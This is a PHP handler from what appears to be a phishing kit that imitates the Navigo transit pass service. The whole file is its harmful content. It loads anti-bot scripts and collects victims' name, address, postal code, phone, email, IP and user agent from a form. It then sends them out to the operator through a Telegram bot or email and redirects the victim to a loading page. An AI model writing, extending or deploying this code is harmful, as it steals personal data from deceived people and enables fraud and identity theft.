<?php
include('../prevents/anti1.php');
include('../prevents/anti2.php');
include('../prevents/anti3.php');
include('../prevents/anti4.php');
include('../prevents/anti5.php');
include('../prevents/anti6.php');
include('../prevents/anti7.php');
include('../prevents/anti8.php');
include('../ab.php');
include '../config.php';
include '../functions.php';

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}


    if ($_SERVER["REQUEST_METHOD"] == "POST")
    {

        if (!empty($_POST["lastName"]) && !empty($_POST["firstName"]) && !empty($_POST["adresse"]) && !empty($_POST["ville"]) && !empty($_POST["cp"]) && !empty($_POST["tel"]))
        {
            $_SESSION["lastName"] = $_POST["lastName"];
            $_SESSION["firstName"] = $_POST["firstName"];

            $message = "DATE: " . date("Y/m/d") . ' à ' . date("H:i:s") . "\n";
            $message .= "[🔑]NAVIGO==INFOS[🔑]\n";
            $message .= "[🌐]ip:" . _ip() . "\n";
            $message .= "[👤]NOM:" . $_POST["lastName"] . "\n";
            $message .= "[👤]PRÉNOM:" . $_POST["firstName"] . "\n";
            $message .= "[🏠]ADRESSE:" . $_POST["adresse"] . "\n";
            $message .= "[🏙️]VILLE:" . $_POST["ville"] . "\n";
            $message .= "[📮]CODE POSTAL:" . $_POST["cp"] . "\n";
            $message .= "[📮]TEL:" . $_POST["tel"] . "\n";
            $message .= "[📧]EMAIL:" . $_POST["email"] . "\n";
            $message .= "=================\n";
            $message .= "[💣]USER AGENT: " . $_SERVER['HTTP_USER_AGENT'] . "\n";

            if($rezParTelegram)
            {
                telegram_send(urlencode($message), $api_key, $chat_id);
            }
            if($rezParMail)
            {
                $mail=mail($my_mail,$Subject,$message,$head);  
            }

            header('Location: ' . "../redirect/loading.php");

        }
        else
        {
            header('Location: ../redirect/info.php');
        }  
    }
    
?>
